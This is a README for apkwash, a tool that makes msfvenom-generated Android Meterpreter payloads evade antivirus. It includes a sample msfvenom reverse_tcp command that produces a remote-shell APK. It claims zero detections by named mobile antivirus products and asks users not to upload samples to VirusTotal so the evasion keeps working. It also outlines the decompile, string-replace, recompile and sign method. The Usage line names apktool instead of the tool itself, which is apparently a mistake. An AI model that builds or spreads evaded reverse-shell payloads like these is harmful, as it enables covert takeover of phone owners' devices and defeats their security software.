# apkwash
Android APK Antivirus evasion for msfvenom generated payloads.
<br><br>
<b> -- Please do not upload "washed" files to VirusTotal.com -- </b><br>
<br>
<b>Dependencies:</b><br>
apt-get install lib32stdc++6 lib32ncurses5 lib32z1<br>
<br>
<b>Setup:</b><br>
chmod +x apkwash<br>
mv apkwash /usr/local/bin/.<br>
<br>
<b>Usage:</b><br>
apktool \<payload>.apk<br>
<br>
<b>Input:</b><br>
This script takes a msfgenerated payload as input.<br>
Ex: msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT<PORT> -o \<payload>.apk<br>
<br>
<b>Output:</b><br>
washed_\<payload>.apk<br>
<br>
<b>Antivirus detection:</b><br>
0/35 on nodistribute - 16Feb17<br>
Verified for AVG mobile<br>
Verified for Kaspersky mobile<br>
<br>
<b>Modifiations</b><br>
Feel free to open the script and make improvements. This script basically utilizes APKTool to open the package, uses sed to replace strings that flag AV, recompiles, then signs.<br>
<br>
<b>Debugging</b><br>
Comment out the removal of the /tmp/payload directory to see the file structure that was compiled.<br>
